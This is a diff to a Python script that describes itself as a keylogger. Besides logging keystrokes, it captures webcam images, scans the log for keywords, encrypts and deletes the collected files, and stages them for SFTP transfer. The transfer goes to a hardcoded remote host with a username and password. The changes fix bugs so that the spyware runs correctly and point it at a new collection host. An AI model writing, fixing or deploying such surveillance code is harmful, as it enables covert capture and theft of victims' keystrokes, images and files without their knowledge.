@@ -20,7 +20,7 @@ screenshot_information = ".png"
 time_iterations = 10
 number_of_iterations_end = 1
 
-myHostname = "143.110.255.166"  # change this
+myHostname = "192.168.44.142"  # change this
 myUsername = "pi"  # change this
 myPassword = "kali123"  # change this #should be 8 characters or more including special characters
 remote_file = '/home/pi/log/'
@@ -78,7 +78,7 @@ def encrypt_files():
 
     for j in folders:
         x = "\\"
-        z = file_path + x + j
+        z = file_path + j
         with open(z, 'rb') as f:
             data = f.read()
             fernet = Fernet(key)
@@ -125,32 +125,39 @@ def delete_files():
         if os.path.isfile(file):
             print('Deleting file:', file)
             os.remove(file)
+        else:
+            pass
 
 
 # Read the log file to find any mentioned threats
 def read_file():
     string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
     # open text file
-    file1 = open(file_path + keys_information, "r")
+    with open(file_path + keys_information, "r") as logfiles:
+        text = logfiles
 
-    for line in file1:
-        if any(keyword in line for keyword in string1):
-            print(line)
-            print("these words were found, storing in Threat Directory")
-            encrypt_files()
-            # sftp_files_threat()
-            delete_files()
-            print("Encrypted and stored in Threat dir")
+        for line in logfiles:
+            if any(keyword in line for keyword in string1):
+                print(line)
+                print("these words were found, storing in Threat Directory")
+                logfiles.close()
+                encrypt_files()
+                # sftp_files_threat()
+                delete_files()
+                print("Encrypted and stored in Threat dir")
+                break
 
-        else:
-            print("no words were found, storing in Log Directory")
-            encrypt_files()
-            # sftp_files_log()
-            delete_files()
-            print("Encrypted and stored in Log dir")
+            else:
+                print("no words were found, storing in Log Directory")
+                logfiles.close()
+                encrypt_files()
+                # sftp_files_log()
+                delete_files()
+                print("Encrypted and stored in Log dir")
+                break
 
         # closing text file
-    file1.close()
+        logfiles.close()
 
 
 number_of_iterations = 0
@@ -240,7 +247,7 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         capture_webcam()
         read_file()
 
-        number_of_iterations += -1
+        number_of_iterations += 1
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
